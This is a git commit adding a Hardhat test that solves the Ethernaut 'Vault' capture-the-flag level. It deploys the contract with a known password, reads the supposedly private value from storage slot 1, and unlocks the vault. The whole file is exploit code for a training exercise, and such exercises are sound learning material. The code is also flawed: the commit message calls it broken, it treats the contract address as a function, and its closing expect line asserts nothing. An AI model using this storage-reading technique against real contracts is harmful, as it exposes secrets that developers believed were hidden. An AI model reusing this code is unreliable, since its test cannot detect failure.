1dd24dee0ef25ba09898f97e5cce8afeb91b50f3
Michael Daly <dalymike102@gmail.com>
2023-06-26 17:01:19 -0400

    Added solution for 8 but its broken from some package bs

---
+++ ethernaut/test/8Vault.ts
@@ -0,0 +1,24 @@
+// This attack cannot be done in foundry because of the lack of getting storage at...
+import { ethers } from "hardhat";
+import chai from "chai";
+
+const { expect } = chai;
+
+describe("VaultAttack", function () {
+  it("gets the password to the vault", async function () {
+    const vaultFactory = await ethers.getContractFactory("Vault");
+    const challengeContract = await vaultFactory.deploy(
+      ethers.formatBytes32String("abcd")
+    );
+    await challengeContract.waitForDeployment();
+    console.log(challengeContract.address());
+    // get hidden value
+    const password = await ethers.provider.getStorageAt(
+      challengeContract.address(),
+      1
+    );
+    // unlock the challenge contract
+    await challengeContract.unlock(password);
+    expect(!challengeContract.locked());
+  });
+});
